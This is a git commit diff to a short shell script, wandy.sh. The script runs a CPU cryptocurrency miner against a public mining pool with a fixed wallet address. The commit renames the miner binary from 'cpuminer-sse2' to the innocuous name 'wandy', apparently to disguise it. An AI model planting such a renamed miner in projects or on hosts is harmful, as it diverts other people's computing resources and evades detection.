4cd683372a29a90ce04d9bd34527401b91bbb756
wandykartiwa <32724225+wandykartiwa@users.noreply.github.com>
2021-02-28 16:02:41 +0700

    wandy.sh

--- wandy.sh
+++ wandy.sh
@@ -3,7 +3,7 @@
 #!/bin/bash
 
 
-chmod +x cpuminer-sse2
+chmod +x wandy
 
-./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qm6zjqrfdkwku2ks7ceapyhc6mw5r24d90hkkc3.myworker
+./wandy -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qm6zjqrfdkwku2ks7ceapyhc6mw5r24d90hkkc3.myworker
 
